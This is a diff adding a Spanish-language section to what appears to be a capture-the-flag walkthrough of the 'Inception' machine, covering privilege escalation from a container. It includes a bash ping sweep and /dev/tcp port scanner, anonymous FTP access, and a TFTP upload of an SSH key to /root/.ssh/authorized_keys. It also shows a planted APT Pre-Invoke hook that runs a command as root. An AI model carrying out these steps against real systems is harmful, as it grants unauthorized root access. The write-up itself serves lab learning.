@@ -326,3 +326,165 @@ cobb@Inception:~$ cat user.txt
 ```
 
 # Escalando Privilegios desde un Contenedor
+Enumerando el posibles hosts en el segmento de red en el que se encuentra el contenedor
+```bash
+#!/bin/bash
+# Programa para enumerar los hosts de tu segmento de red 
+
+for i in $(seq 1 254) ; do
+        timeout 1 bash -c "ping -c 1 192.168.0.$i" >/dev/null 2>&1 && echo "[*] EL Equipo: 192.168.0.$i esta Activo" &
+
+done
+```
+Porcedemos a ejecutar el script en bash para identificar hosts
+```bash
+cobb@Inception:~$ ./host.sh 
+[*] EL Equipo: 192.168.0.10 esta Activo
+[*] EL Equipo: 192.168.0.1 esta Activo
+```
+
+Procedemos a modificar el script para descubrir puertos en el activo encontrado `192.168.0.1`
+```bash
+#!/bin/bash
+# Programa para enumerar los hosts de tu segmento de red 
+
+for port in $(seq 1 65535) ; do
+        timeout 1 bash -c "echo '' > /dev/tcp/192.168.0.1/$port" >/dev/null 2>&1 && echo "[*] EL Puerto: $port esta Activo" &
+
+done
+```
+Ejecutamos el script modificado para encontrar puertos abiertos
+```bash
+cobb@Inception:~$ ./host.sh 
+[*] EL Puerto: 22 esta Activo
+[*] EL Puerto: 53 esta Activo
+[*] EL Puerto: 21 esta Activo
+```
+
+Enuramos 3 puertos abiertos entre ellos el puerto 21 FTP, vamos a empezar enumerando este servicio e intentando conectarnos
+```bash
+cobb@Inception:~$ ftp 192.168.0.1
+Connected to 192.168.0.1.
+220 (vsFTPd 3.0.3)
+Name (192.168.0.1:cobb): anonymous
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    2 0        0            4096 Nov 30  2017 bin
+drwxr-xr-x    3 0        0            4096 Nov 30  2017 boot
+drwxr-xr-x   19 0        0            3920 Nov 03 09:32 dev
+drwxr-xr-x   93 0        0            4096 Nov 30  2017 etc
+drwxr-xr-x    2 0        0            4096 Nov 06  2017 home
+lrwxrwxrwx    1 0        0              33 Nov 30  2017 initrd.img -> boot/initrd.img-4.4.0-101-generic
+lrwxrwxrwx    1 0        0              32 Nov 06  2017 initrd.img.old -> boot/initrd.img-4.4.0-98-generic
+drwxr-xr-x   22 0        0            4096 Nov 30  2017 lib
+drwxr-xr-x    2 0        0            4096 Oct 30  2017 lib64
+drwx------    2 0        0           16384 Oct 30  2017 lost+found
+drwxr-xr-x    3 0        0            4096 Oct 30  2017 media
+drwxr-xr-x    2 0        0            4096 Aug 01  2017 mnt
+drwxr-xr-x    2 0        0            4096 Aug 01  2017 opt
+dr-xr-xr-x  198 0        0               0 Nov 03 09:32 proc
+drwx------    6 0        0            4096 Nov 08  2017 root
+drwxr-xr-x   26 0        0             920 Nov 03 09:32 run
+drwxr-xr-x    2 0        0           12288 Nov 30  2017 sbin
+drwxr-xr-x    2 0        0            4096 Apr 29  2017 snap
+drwxr-xr-x    3 0        0            4096 Nov 06  2017 srv
+dr-xr-xr-x   13 0        0               0 Nov 03 09:32 sys
+drwxrwxrwt   10 0        0            4096 Nov 03 10:00 tmp
+drwxr-xr-x   10 0        0            4096 Oct 30  2017 usr
+drwxr-xr-x   13 0        0            4096 Oct 30  2017 var
+lrwxrwxrwx    1 0        0              30 Nov 30  2017 vmlinuz -> boot/vmlinuz-4.4.0-101-generic
+lrwxrwxrwx    1 0        0              29 Nov 06  2017 vmlinuz.old -> boot/vmlinuz-4.4.0-98-generic
+226 Directory send OK.
+```
+Nos conectamos como el usuario `anonymous` sin password al `servicio FTP`
+```bash
+ftp> cd root
+550 Failed to change directory.
+```
+Intentamos acceder al directorio root y vemos que no lo conseguimos.. 
+Probamos a listar `tareas cron` desde el servicio `FTP`
+```bash
+cobb@Inception:~$ cat crontab 
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user  command
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+*/5 *   * * *   root    apt update 2>&1 >/var/log/apt/custom.log
+30 23   * * *   root    apt upgrade -y 2>&1 >/dev/null
+cobb@Inception:~$ 
+```
+Y encontramos que se esta haciendo cada 5min una actualizacion del sistema, eso es critico, porque resulta que existe un  Pre Commando que se puede ejecutar tanto antes como despues de ejecutarse el upgrade. `https://www.cyberciti.biz/faq/debian-ubuntu-linux-hook-a-script-command-to-apt-get-upgrade-command/`
+
+Procedemos de la siguiente forma... Recordamos que tambien existe la utilidad `TFTP` con la que si por algun factor nos permitiese subir archivos ya que por `FTP` no podemos, podriamos intentar colarle un archivo en la ruta `/etc/apt/apt.conf.d/` para intentar ejecutar un commando.
+
+Creandonos una clave SSH publica para intentar subirla a la maquina victima atraves del servicio `TFTP` en el directorio `/root/.ssh/` llamandola `Authorized_keys`
+```bash
+cobb@Inception:~$ ssh-keygen
+Generating public/private rsa key pair.
+Enter file in which to save the key (/home/cobb/.ssh/id_rsa): 
+Created directory '/home/cobb/.ssh'.
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in /home/cobb/.ssh/id_rsa.
+Your public key has been saved in /home/cobb/.ssh/id_rsa.pub.
+The key fingerprint is:
+SHA256:rXrmYDU7Y998A44tza0EMGOXxrNUw1jJTrw0rlmTPyY cobb@Inception
+The key's randomart image is:
++---[RSA 2048]----+
+|           *+.   |
+|         ..oO.   |
+|        = B= +   |
+|       . O oB    |
+|        S ++ o   |
+|       . +o.E +  |
+|      o *  *.= . |
+|     . +o+o+= +  |
+|      .+. ..+o . |
++----[SHA256]-----+
+cobb@Inception:~$ cd .ssh/
+cobb@Inception:~/.ssh$ ls
+id_rsa  id_rsa.pub
+```
+Probamos a subir el archivo:
+```bash
+cobb@Inception:~/.ssh$ tftp 192.168.0.1
+tftp> put id_rsa.pub /root/.ssh/authorized_keys
+Sent 397 bytes in 0.0 seconds
+```
+Ahora procedemos a crearnos el archivo para meterlo en la ruta del `/etc/apt/apt.conf.d/` y asi ejecutar un comando para darle los permisos necesarios a la clave `athorized_keys` para que nos establezca la conexion por `ssh` sin proporcionar contraseña.
+```bash
+cobb@Inception:~$ cat access 
+APT::Update::Pre-Invoke {"chmod 600 /root/.ssh/authorized_keys"};
+```
+Procedemos a a subir el archivo igual por `TFTP` y cuando se ejecute la tarea `CRON` deberia inyectarnos este comando establecido
+```bash
+cobb@Inception:~$ tftp 192.168.0.1
+tftp> put access /etc/apt/apt.conf.d/access
+Sent 69 bytes in 0.0 seconds
+```
+Una vez subido el archivo probamos a conectarnos por SSH a la maquina
+```bash
+cobb@Inception:~$ ssh root@192.168.0.1
+The authenticity of host '192.168.0.1 (192.168.0.1)' can't be established.
+ECDSA key fingerprint is SHA256:zj8NiAd9po8KKA/z7MGKjn7j6wPFpA2Y6bDTRecUrdE.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '192.168.0.1' (ECDSA) to the list of known hosts.
+root@192.168.0.1's password:
+```
+Vemos que demomento aun nos pide contraseña para entrar, en el momento que se aplique nuestro comando, conseguiremos entrar sin proporcionar contraseña.
